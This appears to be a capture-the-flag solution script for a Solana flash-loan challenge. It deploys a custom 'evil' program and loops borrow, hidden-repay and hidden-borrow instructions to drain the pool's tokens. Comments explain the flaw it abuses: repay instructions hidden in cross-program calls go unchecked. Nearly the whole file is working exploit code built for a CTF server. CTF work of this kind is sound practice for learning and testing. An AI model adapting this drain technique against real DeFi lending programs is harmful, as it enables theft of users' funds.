import * as fs from "fs";
import * as anchor from "@project-serum/anchor";
import { BN } from "bn.js";

import * as api from "./api.js"; 
import { sleep, parseAccounts, sendInstructions } from "./util.js";

// XXX PLAYER IMPORTS should be deleted to avoid spoiling
import { PublicKey, Keypair, SystemProgram, Transaction, SYSVAR_INSTRUCTIONS_PUBKEY } from "@solana/web3.js";
import {
    getAssociatedTokenAddress, TOKEN_PROGRAM_ID,
} from "@solana/spl-token";

const idl = JSON.parse(fs.readFileSync("../idl/challenge3.json"));
const accountFile = parseAccounts(fs.readFileSync("../" + api.PLAYERFILE));
const player = accountFile.player;
const accounts = accountFile.challengeThree;
const program = new anchor.Program(idl, accounts.programId.toString(), "fake truthy value");
const baseUrl = accountFile.endpoint.match(/^(https*:\/\/[^\/]+)\/.*/)[1];
const conn = new anchor.web3.Connection(accountFile.endpoint);

// all player code goes here
async function attack() {
    // i have a local-only adobe branch that makes this work
    let evilIdl = JSON.parse(fs.readFileSync("/home/hana/work/hana/adobe/target/idl/evil.json"));
    let evilElf = fs.readFileSync("/home/hana/work/hana/adobe/target/deploy/evil.so");

    // deploy it
    let evilProgramId = await api.deployProgram(baseUrl, player.publicKey, evilElf);
    let evil = new anchor.Program(evilIdl, evilProgramId, "fake truthy value");

    // get player atomcoin account
    let playerAccount = await getAssociatedTokenAddress(accounts.atomcoinMint, player.publicKey);

    // alright now the attack is conceptually simple
    // the program is a instruction-based flash loan program that uses introspection to enforce repayment
    // our adobe fork correctly steps forward looking for an equivalent repay
    // and it correctly does this even if a player hides a borrow in cpi
    // and it also has a mutex to ensure a player cant hide a second borrow
    // however there is no check to prevent them from hiding a *repay*
    // so we openly borrow half, secretly repay one, secretly borrow half, openly repay half
    // and by doing this in a loop we can steal the entire bank less two
    let steal = async function(amount) {
        let borrow = program.instruction.borrow(new BN(amount), {
            accounts: {
                player: player.publicKey,
                state: accounts.state,
                pool: accounts.pool,
                poolAccount: accounts.poolAccount,
                depositorAccount: playerAccount,
                instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
                tokenProgram: TOKEN_PROGRAM_ID,
        }});

        let evilRepay = evil.instruction.repayProxy(new BN(1), {
            accounts: {
                user: player.publicKey,
                state: accounts.state,
                pool: accounts.pool,
                poolAccount: accounts.poolAccount,
                depositorAccount: playerAccount,
                instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
                tokenProgram: TOKEN_PROGRAM_ID,
                adobeProgram: program.programId,
            },
        });

        let evilBorrow = evil.instruction.borrowProxy(new BN(amount), {
            accounts: {
                user: player.publicKey,
                state: accounts.state,
                pool: accounts.pool,
                poolAccount: accounts.poolAccount,
                depositorAccount: playerAccount,
                instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
                tokenProgram: TOKEN_PROGRAM_ID,
                adobeProgram: program.programId,
            },
        });

        let repay = program.instruction.repay(new BN(amount), {
            accounts: {
                player: player.publicKey,
                user: player.publicKey,
                state: accounts.state,
                pool: accounts.pool,
                poolAccount: accounts.poolAccount,
                depositorAccount: playerAccount,
                tokenProgram: TOKEN_PROGRAM_ID,
        }});

        return await sendInstructions(baseUrl, [borrow, evilRepay, evilBorrow, repay], [player]);
    };

    // ok so the loop is a little tricky
    // we take out x, repay 1, take x again, repay x
    // because both borrows need to see the matching repay
    // this means when bank is even, we can steal one less than half
    // but when odd we can steal half rounded up
    // this means if you handle even and odd the same, its impossible to win
    // because you cant steal half when even, or youre left with 3 when rounding down or subtracting from odd
    // i hope this is enough to at least piss off anyone who lifts the solution from my adobe tests
    let balance = 100;
    do {
        let amount = Math.ceil(balance / 2);
        await steal(amount);

        balance = balance - amount + 1;
        console.log("balance:", balance);

        await sleep(1000);
    } while(balance > 2);

    console.log("done!");
}

console.log("running attack code...");
await attack();

console.log("checking win...");
const flag = await api.getFlag(baseUrl, player.publicKey, 3);

if(flag) {
    console.log("win! your flag is:", flag);
}
else {
    console.log("no win");
}
